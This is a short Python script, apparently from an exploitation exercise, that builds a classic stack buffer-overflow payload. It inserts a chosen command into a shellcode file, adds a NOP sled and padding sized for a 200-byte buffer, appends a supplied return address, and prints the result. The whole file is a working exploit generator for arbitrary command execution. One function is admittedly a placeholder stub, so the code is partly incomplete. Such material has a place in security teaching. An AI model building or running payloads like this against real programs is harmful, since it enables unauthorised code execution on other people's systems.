TEMPLATE_FILE = "modifiedcode.asm"
import os
import sys


def prepare_command(command):
    # Minimal placeholder: return an xor offset and optional db string.
    # Original logic may compute a real xor offset; keep placeholder to preserve behaviour.
    return 0, b""


if __name__ == "__main__":
    if len(sys.argv) == 4:
        address = bytes.fromhex(sys.argv[1])[::-1]  # reverse for little-endian (Stack)
        shellcodeFile = sys.argv[2]
        command = sys.argv[3]
    else:
        print("Usage:", sys.argv[0], "return_address(&buffer) shellcode_filename command")
        sys.exit(1)

    # Read template asm
    with open(TEMPLATE_FILE, "rb") as f:
        asm = bytearray(f.read())

    # Read shellcode file
    with open(shellcodeFile, "rb") as f:
        shellcode = bytearray(f.read())

    xor_offset, db_string = prepare_command(command)

    # Find XOR_OFFSET marker in asm (if present)
    marker = b"XOR_OFFSET"
    try:
        asm_index = asm.index(marker)
    except ValueError:
        asm_index = -1
    asmOffset = asm_index - 1 if asm_index != -1 else -1

    commandBytes = command.encode("ascii")
    shellcode = bytearray(shellcode.replace(b"REPLACE_ME", commandBytes + b"\x0a"))

    # If there's a SIZE_OFFSET marker in the shellcode, set that byte to the command length
    size_marker = b"SIZE_OFFSET"
    sizeOffset = shellcode.find(size_marker)
    if sizeOffset != -1:
        shellcode[sizeOffset] = len(commandBytes) & 0xFF

    bufferSize = 200
    nopSled = b"\x90" * 16
    paddingSize = 16
    padding_len = bufferSize - len(nopSled) - len(shellcode) + paddingSize
    if padding_len < 0:
        padding_len = 0
    padding = b"A" * padding_len
    os.write(1, nopSled + shellcode + padding + address)

